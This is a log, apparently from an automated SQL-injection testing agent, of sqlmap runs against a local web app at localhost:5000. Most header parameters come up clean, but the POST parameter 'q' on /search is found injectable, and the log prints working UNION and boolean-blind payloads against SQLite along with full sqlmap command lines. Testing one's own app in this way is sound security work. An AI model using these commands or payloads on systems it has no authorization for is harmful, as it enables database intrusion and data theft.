INFO - [20:15:27] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:15:28] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:15:28] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:15:29] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:15:29] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:15:29] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:15:29] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:15:29] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:15:29] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:15:29] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:15:29] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:15:29] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:15:29] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:15:29] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:15:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:15:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:15:29] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:15:29] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:15:29] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:15:29] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:15:29] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:15:29] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:15:29] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:15:29] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:15:29] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:15:29] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:15:29] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:29] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:15:29] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:29] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:15:29] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:29] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:15:29] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:15:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:15:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:15:29] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:29] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:15:29] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:29] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:15:29] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:29] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:15:29] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:15:29] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:15:29] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:15:30] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:15:30] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:15:30] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:15:30] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:15:30] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:15:30] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:15:31] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:15:31] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:15:31] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - [20:15:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:15:32] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:15:33] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:15:34] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:15:34] [WARNING] parameter 'User-Agent' does not seem to be injectable
INFO - [20:15:34] [INFO] testing if parameter 'Referer' is dynamic
INFO - [20:15:34] [WARNING] parameter 'Referer' does not appear to be dynamic
INFO - [20:15:34] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
INFO - [20:15:34] [INFO] testing for SQL injection on parameter 'Referer'
INFO - [20:15:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:15:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:15:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:15:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:15:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:15:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:15:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:15:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:15:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:15:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:15:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:15:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:15:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:15:38] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:15:39] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:15:39] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:15:40] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:15:40] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:15:41] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:15:41] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:15:42] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:15:42] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:15:43] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:15:43] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:15:44] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:15:44] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:15:45] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:15:45] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:15:45] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:15:45] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:15:45] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:15:45] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:15:45] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:15:45] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:15:45] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:15:45] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:15:45] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:15:45] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:15:45] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:15:45] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:15:45] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:15:45] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:15:45] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:15:45] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:15:45] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:15:45] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:15:45] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:15:45] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:15:45] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:15:45] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:45] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:15:45] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:45] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:15:45] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:45] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:15:45] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:15:45] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:15:45] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:15:45] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:45] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:15:45] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:45] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:15:45] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:45] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:15:45] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:15:45] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:15:45] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:15:46] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:15:46] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:15:46] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:15:46] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:15:46] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:15:47] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:15:47] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:15:47] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:15:47] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - [20:15:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:15:48] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:15:49] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:15:50] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:15:51] [WARNING] parameter 'Referer' does not seem to be injectable
INFO - [20:15:51] [INFO] testing if parameter 'Host' is dynamic
INFO - [20:15:51] [WARNING] parameter 'Host' does not appear to be dynamic
INFO - [20:15:51] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
INFO - [20:15:51] [INFO] testing for SQL injection on parameter 'Host'
INFO - [20:15:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:15:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:15:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:15:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:15:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:15:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:15:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:15:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:15:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:15:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:15:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:15:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:15:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:15:56] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:15:56] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:15:57] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:15:57] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:15:57] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:15:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:15:58] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:15:59] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:15:59] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:16:00] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:16:00] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:16:01] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:16:01] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:16:02] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:16:02] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:16:02] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:16:02] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:16:02] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:16:02] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:16:02] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:16:02] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:16:02] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:16:02] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:16:02] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:16:02] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:16:02] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:16:02] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:16:02] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:16:02] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:16:02] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:16:02] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:16:02] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:16:02] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:16:02] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:16:02] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:16:02] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:16:02] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:16:02] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:16:02] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:16:02] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:16:02] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:16:02] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:16:02] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:16:02] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:16:02] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:16:02] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:16:02] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:16:02] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:16:02] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:16:02] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:16:02] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:16:02] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:16:02] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:16:02] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:16:03] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:16:03] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:16:03] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:16:03] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:16:03] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:16:04] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:16:04] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:16:04] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:16:04] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - [20:16:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:16:05] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:16:06] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:16:06] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:16:07] [WARNING] parameter 'Host' does not seem to be injectable
INFO - [20:16:07] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:16:07] [WARNING] HTTP error codes detected during run:
INFO - 404 (Not Found) - 2314 times
INFO - [*] ending @ 20:16:07 /2025-09-26/
INFO - No clear injection detected during discovery for http://localhost:5000/api/user/1
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/search --data q=test
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:16:10 /2025-09-26/
INFO - [20:16:13] [INFO] flushing session file
INFO - [20:16:13] [INFO] testing connection to the target URL
INFO - [20:16:13] [INFO] checking if the target is protected by some kind of WAF/IPS
INFO - [20:16:13] [INFO] testing if the target URL content is stable
INFO - [20:16:13] [INFO] target URL content is stable
INFO - [20:16:13] [INFO] testing if POST parameter 'q' is dynamic
INFO - [20:16:13] [WARNING] POST parameter 'q' does not appear to be dynamic
INFO - [20:16:13] [WARNING] heuristic (basic) test shows that POST parameter 'q' might not be injectable
INFO - [20:16:13] [INFO] testing for SQL injection on POST parameter 'q'
INFO - [20:16:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:16:13] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:16:13] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:16:13] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:16:14] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:16:14] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:16:14] [INFO] testing 'Generic inline queries'
INFO - [20:16:14] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:16:14] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:16:14] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:16:14] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:16:14] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:16:14] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:16:14] [INFO] testing 'Oracle AND time-based blind'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:16:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:16:14] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
INFO - [20:16:14] [INFO] target URL appears to have 2 columns in query
INFO - [20:16:14] [WARNING] applying generic concatenation (CONCAT)
INFO - [20:16:14] [INFO] POST parameter 'q' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
INFO - [20:16:14] [INFO] checking if the injection point on POST parameter 'q' is a false positive
INFO - POST parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
INFO - sqlmap identified the following injection point(s) with a total of 82 HTTP(s) requests:
INFO - ---
INFO - Parameter: q (POST)
INFO -     Type: UNION query
INFO -     Title: Generic UNION query (NULL) - 2 columns
INFO -     Payload: q=test' UNION ALL SELECT CONCAT(CONCAT('qzvjq','IeyMIvzJwuXrHWvmBzWOgnWicWoQybHTWdGZbvoM'),'qjvjq'),NULL-- zLhR
INFO - ---
INFO - [20:16:14] [INFO] testing MySQL
INFO - [20:16:14] [WARNING] the back-end DBMS is not MySQL
INFO - [20:16:14] [INFO] testing Oracle
INFO - [20:16:14] [WARNING] the back-end DBMS is not Oracle
INFO - [20:16:14] [INFO] testing PostgreSQL
INFO - [20:16:14] [WARNING] the back-end DBMS is not PostgreSQL
INFO - [20:16:14] [INFO] testing Microsoft SQL Server
INFO - [20:16:14] [WARNING] the back-end DBMS is not Microsoft SQL Server
INFO - [20:16:14] [INFO] testing SQLite
INFO - [20:16:14] [INFO] confirming SQLite
INFO - [20:16:14] [INFO] actively fingerprinting SQLite
INFO - [20:16:14] [INFO] the back-end DBMS is SQLite
INFO - back-end DBMS: SQLite
INFO - [20:16:14] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 45 times
INFO - [20:16:14] [INFO] fetched data logged to text files under 'C:\Users\Ronald Wilson\AppData\Local\sqlmap\output\localhost'
INFO - [*] ending @ 20:16:14 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/search (log: attack-logs-dynamic\Search_Users_flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/search --output-dir 'attack-logs-dynamic\Search_Users_sqlmap' --batch --level=5 --risk=3 --threads 5 --data q=test --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:16:18 /2025-09-26/
INFO - [20:16:20] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_Users_sqlmap' as the output directory
INFO - [20:16:21] [INFO] resuming back-end DBMS 'sqlite'
INFO - [20:16:21] [INFO] testing connection to the target URL
INFO - sqlmap resumed the following injection point(s) from stored session:
INFO - ---
INFO - Parameter: q (POST)
INFO -     Type: boolean-based blind
INFO -     Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
INFO -     Payload: q=test' OR NOT 4394=4394-- Trsa
INFO -     Type: UNION query
INFO -     Title: Generic UNION query (NULL) - 2 columns
INFO -     Payload: q=test' UNION ALL SELECT NULL,CHAR(113,118,107,122,113)||CHAR(121,66,73,80,87,73,114,109,87,69,110,105,119,70,79,80,112,88,66,100,74,88,76,100,122,85,105,118,105,79,76,77,79,79,115,110,86,102,71,89)||CHAR(113,113,118,98,113)-- Ufkr
INFO - ---
INFO - [20:16:21] [INFO] the back-end DBMS is SQLite
INFO - back-end DBMS: SQLite
INFO - [20:16:21] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_Users_sqlmap\localhost'
INFO - [*] ending @ 20:16:21 /2025-09-26/
